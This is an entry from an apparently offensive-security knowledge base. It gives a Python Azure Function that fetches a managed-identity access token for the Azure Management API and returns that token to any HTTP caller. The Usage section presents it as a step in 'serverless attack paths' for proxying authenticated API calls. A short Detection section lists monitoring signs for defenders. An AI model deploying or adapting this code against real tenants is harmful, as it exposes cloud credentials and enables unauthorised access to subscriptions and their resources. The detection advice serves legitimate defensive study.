---
id: 4d21b2c8-fb61-4eb4-b0c6-8358cd8e6f6f
type: code
language: Python
verified: true
created_at: '2023-05-24T16:05:50.821060+00:00'
updated_at: '2023-05-24T16:05:50.839431+00:00'
platforms:
  - Cloud
tags:
  - Azure Functions
  - Managed Identity
  - Serverless
validated: true
---

# Azure-Function-for-Managed-Identity-Token-Retrieval

## Code

```python
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```

## Description

This code implements an Azure Function (Python runtime) that retrieves an access token for the Azure Management API using Managed Identity. Triggered by an HTTP request, it logs the event, fetches the token via cURL, and returns the raw JSON response containing the token.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IDENTITY_ENDPOINT | The IMDS endpoint for token acquisition | http://169.254.169.254/metadata/identity/oauth2/token |
| IDENTITY_HEADER | Authentication header for the identity | X-IDENTITY-HEADER:secretvalue |

## Usage

Deploy as an HTTP-triggered Azure Function with Managed Identity enabled and Reader role on the target subscription. Invoke via POST/GET to the function URL to receive the token response. Useful for chaining in serverless attack paths where the function can proxy authenticated API calls.

## Detection

- Azure Functions logs will show HTTP triggers and cURL executions; monitor for unusual invocation patterns.
- Watch for Function App principal accessing Management API beyond normal operations.
- Enable App Insights for process monitoring, detecting os.popen calls or IMDS traffic from function sandboxes.

## Related

- [[procedures/Azure-Access-Token-Retrieval-for-Management-and-Graph-APIs-using-Python]]
